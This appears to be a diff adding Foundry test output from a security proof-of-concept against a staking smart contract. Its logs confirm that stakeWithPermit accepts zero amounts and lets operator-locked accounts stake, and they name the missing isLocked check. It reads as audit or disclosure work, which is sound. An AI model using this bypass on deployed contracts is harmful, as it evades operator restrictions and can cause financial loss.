@@ -1,0 +1,27 @@
+forge test --match-contract StakingIsLockedBypassPoc -vv
+[⠰] Compiling...
+No files changed, compilation skipped
+
+Ran 2 tests for test/poc_Staking_isLocked_Bypass_test.sol:StakingIsLockedBypassPoc
+[PASS] test_stakeWithPermit_allows_zero_amount() (gas: 106213)
+Logs:
+  [check] stake(0) correctly reverts with InvalidStakingAmount
+  [bypass] stakeWithPermit(0) SUCCEEDED -- firstStakeTimestamp set: 1
+  [impact] Subsequent real stake enters totalDebt path,
+           incurring debt from firstStakeTimestamp to now.
+  === ZERO-AMOUNT BYPASS CONFIRMED ===
+
+[PASS] test_stakeWithPermit_bypasses_isLocked() (gas: 212256)
+Logs:
+  [setup] Operator locked Alice's account
+  [check] stake() correctly reverts with AccountIsLocked
+  [bypass] stakeWithPermit() SUCCEEDED for locked account!
+  [bypass] Alice is still locked: true
+  [bypass] Alice's staked principal: 1000 tokens
+  === BYPASS CONFIRMED ===
+  stakeWithPermit() missing: if (stakeInfo[owner].isLocked) revert AccountIsLocked()
+  Locked accounts can circumvent operator restrictions via permit path.
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 93.90ms (92.40ms CPU time)
+
+Ran 1 test suite in 213.14ms (93.90ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
